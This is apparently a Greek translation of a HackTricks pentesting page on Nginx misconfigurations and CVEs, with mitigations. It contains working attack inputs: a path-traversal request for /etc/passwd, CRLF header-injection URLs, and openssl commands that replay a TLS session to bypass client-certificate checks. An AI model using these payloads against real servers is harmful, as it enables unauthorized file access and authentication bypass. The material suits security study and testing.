# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Έλλειψη root location <a href="#missing-root-location" id="missing-root-location"></a>

Κατά τη διαμόρφωση του Nginx διακομιστή, η **root directive** παίζει κρίσιμο ρόλο ορίζοντας τον βασικό κατάλογο από τον οποίο εξυπηρετούνται τα αρχεία. Δείτε το παρακάτω παράδειγμα:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
Σε αυτή τη διαμόρφωση, `/etc/nginx` ορίζεται ως ο root κατάλογος. Αυτή η ρύθμιση επιτρέπει πρόσβαση σε αρχεία εντός του συγκεκριμένου root καταλόγου, όπως το `/hello.txt`. Ωστόσο, είναι κρίσιμο να σημειωθεί ότι έχει οριστεί μόνο μία συγκεκριμένη location (`/hello.txt`). Δεν υπάρχει διαμόρφωση για τη ρίζα (`location / {...}`). Αυτή η παράλειψη σημαίνει ότι η οδηγία root εφαρμόζεται παγκοσμίως, επιτρέποντας αιτήματα προς το root μονοπάτι `/` να προσπελάσουν αρχεία κάτω από το `/etc/nginx`.

Από αυτή τη διαμόρφωση προκύπτει ένα κρίσιμο ζήτημα ασφάλειας. Ένα απλό `GET` request, όπως `GET /nginx.conf`, μπορεί να αποκαλύψει ευαίσθητες πληροφορίες εξυπηρετώντας το Nginx configuration file που βρίσκεται στο `/etc/nginx/nginx.conf`. Ορισμός του root σε έναν λιγότερο ευαίσθητο κατάλογο, όπως το `/etc`, μπορεί να μετριάσει αυτόν τον κίνδυνο, αλλά ενδέχεται ακόμα να επιτρέψει μη επιθυμητή πρόσβαση σε άλλα κρίσιμα αρχεία, συμπεριλαμβανομένων άλλων configuration files, access logs και ακόμη και encrypted credentials που χρησιμοποιούνται για HTTP basic authentication.

## Εσφαλμένη διαμόρφωση Alias LFI <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

Στα configuration files του Nginx, χρειάζεται προσεκτική επιθεώρηση των "location" directives. Μια ευπάθεια γνωστή ως Local File Inclusion (LFI) μπορεί να εισαχθεί ακούσια μέσω μιας διαμόρφωσης που μοιάζει με την ακόλουθη:
```
location /imgs {
alias /path/images/;
}
```
Αυτή η διαμόρφωση είναι επιρρεπής σε επιθέσεις LFI επειδή ο διακομιστής ερμηνεύει αιτήματα όπως `/imgs../flag.txt` ως προσπάθεια πρόσβασης σε αρχεία εκτός του προοριζόμενου καταλόγου, ουσιαστικά επιλύοντας σε `/path/images/../flag.txt`. Αυτή η αδυναμία επιτρέπει σε επιτιθέμενους να ανακτήσουν αρχεία από το σύστημα αρχείων του διακομιστή που δεν θα έπρεπε να είναι προσβάσιμα μέσω του web.

Για να μετριαστεί αυτή η ευπάθεια, η διαμόρφωση θα πρέπει να προσαρμοστεί ως εξής:
```
location /imgs/ {
alias /path/images/;
}
```
Περισσότερες πληροφορίες: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Δοκιμές Accunetix:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Ανασφαλής περιορισμός διαδρομής <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Δείτε την παρακάτω σελίδα για να μάθετε πώς να bypass directives όπως:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Unsafe variable use / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Ευάλωτες μεταβλητές `$uri` και `$document_ur`i και αυτό μπορεί να διορθωθεί αντικαθιστώντας τες με `$request_uri`.
>
> Ένα regex μπορεί επίσης να είναι ευάλωτο όπως:
>
> `location ~ /docs/([^/])? { … $1 … }` - Ευάλωτο
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Μη ευάλωτο (έλεγχος για κενά)
>
> `location ~ /docs/(.*)? { … $1 … }` - Μη ευάλωτο

Μια ευπάθεια στην διαμόρφωση του Nginx αποδεικνύεται από το παρακάτω παράδειγμα:
```
location / {
return 302 https://example.com$uri;
}
```
Οι χαρακτήρες \r (Carriage Return) και \n (Line Feed) δηλώνουν χαρακτήρες νέας γραμμής σε HTTP αιτήματα, και οι URL-encoded μορφές τους αναπαριστούνται ως `%0d%0a`. Η συμπερίληψη αυτών των χαρακτήρων σε ένα αίτημα (π.χ., `http://localhost/%0d%0aDetectify:%20clrf`) προς έναν misconfigured server έχει ως αποτέλεσμα ο server να εκδώσει ένα νέο header με όνομα `Detectify`. Αυτό συμβαίνει επειδή η μεταβλητή $uri αποκωδικοποιεί τους URL-encoded χαρακτήρες νέας γραμμής, οδηγώντας σε ένα απρόσμενο header στην απάντηση:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Μάθετε περισσότερα για τους κινδύνους του CRLF injection και του response splitting στο [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Επίσης αυτή η τεχνική είναι [**explained in this talk**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) με μερικά ευάλωτα παραδείγματα και μηχανισμούς ανίχνευσης. Για παράδειγμα, για να εντοπίσετε αυτήν την κακόδιαμόρφωση από μια blackbox προοπτική, μπορείτε να κάνετε τις εξής αιτήσεις:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

Εάν είναι ευάλωτο, η πρώτη θα επιστρέψει καθώς το "X" είναι οποιαδήποτε HTTP μέθοδος και η δεύτερη θα επιστρέψει σφάλμα καθώς το H δεν είναι έγκυρη μέθοδος. Έτσι ο server θα λάβει κάτι σαν: `GET / H HTTP/1.1` και αυτό θα προκαλέσει το σφάλμα.

Άλλα παραδείγματα ανίχνευσης θα ήταν:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Κάποιες ευπαθείς διαμορφώσεις που βρέθηκαν και παρουσιάστηκαν σε εκείνη την ομιλία ήταν:

- Σημειώστε πώς **`$uri`** είναι ρυθμισμένο όπως είναι στο τελικό URL
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Σημείωσε πώς και πάλι **`$uri`** βρίσκεται στο URL (αυτή τη φορά μέσα σε παράμετρο)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Τώρα σε AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Οποιαδήποτε μεταβλητή

Αποκαλύφθηκε ότι τα **δεδομένα που παρέχονται από τον χρήστη** μπορεί να αντιμετωπίζονται ως **Nginx μεταβλητή** υπό ορισμένες περιστάσεις. Η αιτία αυτής της συμπεριφοράς παραμένει κάπως ασαφής, ωστόσο δεν είναι σπάνιο ούτε εύκολο να επαληθευτεί. Αυτή η ανωμαλία επισημάνθηκε σε μια αναφορά ασφάλειας στο HackerOne, η οποία μπορεί να προβληθεί [here](https://hackerone.com/reports/370094). Περαιτέρω έρευνα στο μήνυμα λάθους οδήγησε στον εντοπισμό της εμφάνισής της μέσα στο [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), υποδεικνύοντας τα Server Side Includes (SSI) ως την βασική αιτία.

Για να **εντοπιστεί αυτή η λανθασμένη διαμόρφωση**, μπορεί να εκτελεστεί η ακόλουθη εντολή, η οποία περιλαμβάνει τη ρύθμιση ενός referer header για να δοκιμάσει την εκτύπωση μεταβλητών:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Οι σαρώσεις για αυτήν την misconfiguration σε διάφορα συστήματα αποκάλυψαν πολλαπλές περιπτώσεις όπου Nginx variables μπορούσαν να εκτεθούν σε χρήστη. Ωστόσο, η μείωση στον αριθμό των vulnerable περιπτώσεων υποδηλώνει ότι οι προσπάθειες να patch αυτό το ζήτημα υπήρξαν σε κάποιο βαθμό επιτυχείς.

### Χρήση του try_files με $URI$ARGS variables

Η παρακάτω Nginx misconfiguration μπορεί να οδηγήσει σε LFI vulnerability:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
Στην διαμόρφωσή μας έχουμε την οδηγία `try_files` η οποία χρησιμοποιείται για να ελέγξει την ύπαρξη αρχείων σε καθορισμένη σειρά. O Nginx θα εξυπηρετήσει το πρώτο που θα βρει. Η βασική σύνταξη της οδηγίας `try_files` είναι η εξής:
```
try_files file1 file2 ... fileN fallback;
```
Το Nginx θα ελέγξει για την ύπαρξη κάθε αρχείου με τη δηλωμένη σειρά. Αν ένα αρχείο υπάρχει, θα σερβιριστεί αμέσως. Αν κανένα από τα καθορισμένα αρχεία δεν υπάρχει, το αίτημα θα περαστεί στην επιλογή fallback, η οποία μπορεί να είναι άλλο URI ή μια συγκεκριμένη σελίδα σφάλματος.

Ωστόσο, όταν χρησιμοποιούνται οι μεταβλητές `$uri$args` σε αυτή την οδηγία, το Nginx θα προσπαθήσει να εντοπίσει ένα αρχείο που ταιριάζει στο URI του αιτήματος συνδυασμένο με τυχόν παραμέτρους query string. Επομένως μπορούμε να εκμεταλλευτούμε αυτή τη διαμόρφωση:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Με το ακόλουθο payload:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Χρησιμοποιώντας το payload θα ξεφύγουμε από τον root directory (ορισμένο στην Nginx configuration) και θα φορτώσουμε το `/etc/passwd` αρχείο. Στα debug logs μπορούμε να παρατηρήσουμε πώς το Nginx δοκιμάζει τα αρχεία:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC εναντίον του Nginx χρησιμοποιώντας τη ρύθμιση που αναφέρθηκε παραπάνω:
![Παράδειγμα αιτήματος burp](../../images/nginx_try_files.png)

## Ανάγνωση ακατέργαστης απάντησης backend

Το Nginx παρέχει μια δυνατότητα μέσω του `proxy_pass` που επιτρέπει την υποκλοπή σφαλμάτων και HTTP headers που παράγονται από το backend, με στόχο την απόκρυψη εσωτερικών μηνυμάτων σφάλματος και headers. Αυτό επιτυγχάνεται από το Nginx σερβίροντας προσαρμοσμένες σελίδες σφάλματος ως απάντηση σε σφάλματα του backend. Ωστόσο, προκύπτουν προβλήματα όταν το Nginx συναντήσει ένα μη έγκυρο HTTP request. Ένα τέτοιο request προωθείται στο backend όπως έχει, και η ακατέργαστη απάντηση του backend αποστέλλεται απευθείας στον client χωρίς παρέμβαση του Nginx.

Σκεφτείτε ένα παράδειγμα σεναρίου που περιλαμβάνει μια εφαρμογή uWSGI:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Για να το διαχειριστούμε, χρησιμοποιούνται συγκεκριμένες οδηγίες στη διαμόρφωση του Nginx:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Αυτή η οδηγία επιτρέπει στο Nginx να σερβίρει μια προσαρμοσμένη απόκριση για backend responses με status code μεγαλύτερο από 300. Διασφαλίζει ότι, για την περίπτωσή μας με την εφαρμογή uWSGI, μια απόκριση `500 Error` παρεμποδίζεται και διαχειρίζεται από το Nginx.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Όπως υποδηλώνει το όνομα, αυτή η οδηγία αποκρύπτει συγκεκριμένα HTTP headers από τον client, ενισχύοντας το απόρρητο και την ασφάλεια.

Όταν γίνεται ένα έγκυρο `GET` request, το Nginx το επεξεργάζεται κανονικά, επιστρέφοντας μια τυπική error response χωρίς να αποκαλύπτει οποιαδήποτε μυστικά headers. Ωστόσο, ένα μη έγκυρο HTTP request παρακάμπτει αυτόν τον μηχανισμό, με αποτέλεσμα την έκθεση των ακατέργαστων backend responses, συμπεριλαμβανομένων των μυστικών headers και των μηνυμάτων σφάλματος.

## merge_slashes set to off

Από προεπιλογή, η οδηγία **`merge_slashes`** του Nginx έχει τιμή **`on`**, η οποία συμπιέζει πολλαπλά forward slashes σε ένα URL σε ένα μόνο slash. Αυτή η λειτουργία, ενώ απλοποιεί την επεξεργασία των URLs, μπορεί να αποκρύψει ευπάθειες στις εφαρμογές πίσω από το Nginx, ιδιαίτερα αυτές που είναι ευάλωτες σε επιθέσεις local file inclusion (LFI). Οι ασφάλειας Danny Robinson και Rotem Bar έχουν επισημάνει τους πιθανούς κινδύνους που συνδέονται με αυτή την προεπιλεγμένη συμπεριφορά, ειδικά όταν το Nginx λειτουργεί ως reverse-proxy.

Για τη μείωση τέτοιων κινδύνων, συνιστάται να **απενεργοποιήσετε την οδηγία `merge_slashes`** για εφαρμογές που είναι επιρρεπείς σε αυτές τις ευπάθειες. Αυτό διασφαλίζει ότι το Nginx προωθεί τα requests στην εφαρμογή χωρίς να αλλάζει τη δομή του URL, και έτσι δεν καλύπτονται τυχόν υποκείμενα προβλήματα ασφαλείας.

Για περισσότερες πληροφορίες δείτε [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious Response Headers**

Όπως φαίνεται στο [**this writeup**](https://mizu.re/post/cors-playground), υπάρχουν ορισμένα headers που, αν εμφανιστούν στην απόκριση από τον web server, αλλάζουν τη συμπεριφορά του Nginx proxy. Μπορείτε να τα ελέγξετε [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect`: Υποδεικνύει στο Nginx να κάνει internal redirect ενός request σε μια συγκεκριμένη τοποθεσία.
- `X-Accel-Buffering`: Ελέγχει αν το Nginx θα πρέπει να κάνει buffering της απόκρισης ή όχι.
- `X-Accel-Charset`: Ορίζει το character set για την απόκριση όταν χρησιμοποιείται το X-Accel-Redirect.
- `X-Accel-Expires`: Ορίζει τον χρόνο λήξης για την απόκριση όταν χρησιμοποιείται το X-Accel-Redirect.
- `X-Accel-Limit-Rate`: Περιορίζει το ρυθμό μεταφοράς για απαντήσεις όταν χρησιμοποιείται το X-Accel-Redirect.

Για παράδειγμα, το header **`X-Accel-Redirect`** θα προκαλέσει μια εσωτερική **redirect** στο nginx. Έτσι, έχοντας μια nginx configuration με κάτι όπως **`root /`** και μια απόκριση από τον web server με **`X-Accel-Redirect: .env`**, το nginx θα στείλει το περιεχόμενο του **`/.env`** (Path Traversal).

### **Default Value in Map Directive**

Στην **Nginx configuration**, η οδηγία `map` συχνά παίζει ρόλο στον **έλεγχο εξουσιοδότησης**. Ένα συνηθισμένο λάθος είναι να μην ορίζεται μια **default** τιμή, κάτι που μπορεί να οδηγήσει σε μη εξουσιοδοτημένη πρόσβαση. Για παράδειγμα:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Χωρίς το `default`, ένας **κακόβουλος χρήστης** μπορεί να παρακάμψει την ασφάλεια προσπελάζοντας ένα **απροσδιόριστο URI** μέσα στο `/map-poc`. [Το εγχειρίδιο του Nginx](https://nginx.org/en/docs/http/ngx_http_map_module.html) συστήνει τον ορισμό μιας **προεπιλεγμένης τιμής** για να αποφευχθούν τέτοια προβλήματα.

### **DNS Spoofing Vulnerability**

DNS spoofing εναντίον του Nginx είναι εφικτό υπό ορισμένες προϋποθέσεις. Αν ένας attacker γνωρίζει τον **DNS server** που χρησιμοποιεί ο Nginx και μπορεί να υποκλέψει τις DNS queries του, μπορεί να spoof-άρει DNS records. Αυτή η μέθοδος, ωστόσο, είναι αναποτελεσματική αν ο Nginx έχει ρυθμιστεί να χρησιμοποιεί **localhost (127.0.0.1)** για την επίλυση DNS. Ο Nginx επιτρέπει τον καθορισμό ενός DNS server ως εξής:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` και `internal` Οδηγίες**

Η **`proxy_pass`** οδηγία χρησιμοποιείται για την ανακατεύθυνση αιτημάτων σε άλλους servers, είτε εσωτερικά είτε εξωτερικά. Η **`internal`** οδηγία εξασφαλίζει ότι ορισμένες τοποθεσίες είναι προσβάσιμες μόνο από το Nginx. Παρόλο που αυτές οι οδηγίες από μόνες τους δεν αποτελούν ευπάθειες, η διαμόρφωσή τους απαιτεί προσεκτικό έλεγχο για να αποφευχθούν κενά ασφαλείας.

## proxy_set_header Upgrade & Connection

Εάν ο nginx server έχει ρυθμιστεί να προωθεί τα headers Upgrade και Connection, μπορεί να εκτελεστεί μια [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) για πρόσβαση σε προστατευμένα/εσωτερικά endpoints.

> [!CAUTION]
> Αυτή η ευπάθεια θα επέτρεπε σε έναν επιτιθέμενο να δημιουργήσει άμεση σύνδεση με το `proxy_pass` endpoint (`http://backend:9999` σε αυτήν την περίπτωση), του οποίου το περιεχόμενο δεν θα ελεγχθεί από το nginx.

Example of vulnerable configuration to steal `/flag` from [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Σημειώστε ότι ακόμα και αν το `proxy_pass` έδειχνε σε συγκεκριμένο **path** όπως `http://backend:9999/socket.io`, η σύνδεση θα πραγματοποιηθεί με `http://backend:9999` οπότε μπορείτε να **επικοινωνήσετε με οποιοδήποτε άλλο path μέσα σε εκείνο το εσωτερικό endpoint. Επομένως δεν έχει σημασία αν έχει καθοριστεί path στο URL του proxy_pass.**

## HTTP/3 QUIC module απομακρυσμένο DoS & leak (2024)

Κατά τη διάρκεια του 2024 η Nginx αποκάλυψε τα CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 και CVE-2024-35200, δείχνοντας ότι μια **single hostile QUIC session** μπορεί να crash worker processes ή να leak memory όποτε το πειραματικό `ngx_http_v3_module` είναι compiled και ένα `listen ... quic` socket είναι exposed. Επηρεαζόμενα builds είναι 1.25.0–1.25.5 και 1.26.0, ενώ οι 1.27.0/1.26.1 περιλαμβάνουν τα fixes· η memory disclosure (CVE-2024-34161) επιπλέον απαιτεί MTUs μεγαλύτερα από 4096 bytes για να αποκαλύψει ευαίσθητα δεδομένα (λεπτομέρειες στην 2024 nginx advisory που αναφέρεται παρακάτω).

**Recon & exploitation hints**

- Το HTTP/3 είναι opt-in, οπότε κάντε scan για απαντήσεις `Alt-Svc: h3=":443"` ή brute-force UDP/443 QUIC handshakes· μόλις επιβεβαιωθεί, fuzz το handshake και τα STREAM frames με custom `quiche-client`/`nghttp3` payloads για να προκαλέσετε worker crashes και να εξαναγκάσετε log leakage.
- Εντοπίστε γρήγορα την υποστήριξη του στόχου με:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## Παράκαμψη επαναχρησιμοποίησης συνεδρίας TLS για client cert auth (CVE-2025-23419)

Μια ανακοίνωση του Φεβρουαρίου 2025 αποκάλυψε ότι το nginx 1.11.4–1.27.3 που χτίστηκε με OpenSSL επιτρέπει την **reusing a TLS 1.3 session** από ένα name-based virtual host μέσα σε άλλο, έτσι ώστε ένας client που διαπραγματεύτηκε έναν host χωρίς πιστοποιητικό να μπορεί να επαναλάβει το ticket/PSK για να μπει σε ένα vhost προστατευμένο με `ssl_verify_client on;` και να παρακάμψει εντελώς το mTLS. Το σφάλμα ενεργοποιείται όποτε πολλαπλοί virtual hosts μοιράζονται την ίδια TLS 1.3 session cache και tickets (βλέπε τη σύσταση nginx του 2025 που αναφέρεται παρακάτω).

**Οδηγός επιτιθέμενου**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Αν ο στόχος είναι ευπαθής, το δεύτερο handshake ολοκληρώνεται χωρίς την παρουσίαση ενός client certificate, αποκαλύπτοντας προστατευμένες τοποθεσίες.

**Τι να ελέγξετε**

- Μικτά `server_name` blocks που μοιράζονται `ssl_session_cache shared:SSL` καθώς και `ssl_session_tickets on;`.
- Admin/API blocks που αναμένουν mTLS αλλά κληρονομούν shared session cache/ticket ρυθμίσεις από public hosts.
- Automation που ενεργοποιεί TLS 1.3 session resumption παγκοσμίως (π.χ. Ansible roles) χωρίς να λαμβάνει υπόψη τον διαχωρισμό vhost.

## HTTP/2 Rapid Reset resilience (CVE-2023-44487 behavior)

Η επίθεση HTTP/2 Rapid Reset (CVE-2023-44487) εξακολουθεί να επηρεάζει το nginx όταν οι χειριστές ανεβάζουν τα `keepalive_requests` ή `http2_max_concurrent_streams` πέρα από τις προεπιλογές: ένας επιτιθέμενος ανοίγει μία HTTP/2 σύνδεση, τη γεμίζει με χιλιάδες streams και στη συνέχεια στέλνει άμεσα frames `RST_STREAM` ώστε το όριο ταυτόχρονων συνδέσεων να μην φτάνεται ποτέ, ενώ η CPU συνεχίζει να καταναλώνεται στη λογική τερματισμού. Οι προεπιλογές του nginx (128 concurrent streams, 1000 keepalive requests) κρατούν το πεδίο της ζημιάς μικρό· αν αυξήσετε αυτά τα όρια «σημαντικά υψηλότερα» γίνεται εύκολο να εξαντλήσετε τους workers ακόμα και από έναν μόνο client (βλ. την ανάλυση της F5 που αναφέρεται παρακάτω).

**Συμβουλές εντοπισμού**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Οι διακομιστές που αποκαλύπτουν ασυνήθιστα υψηλές τιμές για αυτές τις οδηγίες είναι πρώτοι στόχοι: ένας HTTP/2 client μπορεί να επαναλαμβάνει τη δημιουργία stream και τα άμεσα `RST_STREAM` frames για να διατηρεί την CPU σε υψηλή φόρτιση χωρίς να ενεργοποιείται το όριο ταυτόχρονης εκτέλεσης.

## Δοκιμάστε το μόνοι σας

Η Detectify έχει δημιουργήσει ένα αποθετήριο GitHub όπου μπορείτε να χρησιμοποιήσετε Docker για να στήσετε τον δικό σας ευάλωτο Nginx δοκιμαστικό διακομιστή με μερικές από τις λανθασμένες διαμορφώσεις που συζητήθηκαν σε αυτό το άρθρο και να προσπαθήσετε να τις εντοπίσετε μόνοι σας!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Στατικά εργαλεία ανάλυσης

### [GIXY](https://github.com/yandex/gixy)

Το Gixy είναι ένα εργαλείο για την ανάλυση της διαμόρφωσης του Nginx. Ο κύριος στόχος του Gixy είναι να αποτρέψει λανθασμένες ρυθμίσεις ασφαλείας και να αυτοματοποιήσει τον εντοπισμό σφαλμάτων.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Το Nginxpwner είναι ένα απλό εργαλείο για την αναζήτηση κοινών λανθασμένων ρυθμίσεων του Nginx και ευπαθειών.

## Αναφορές

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
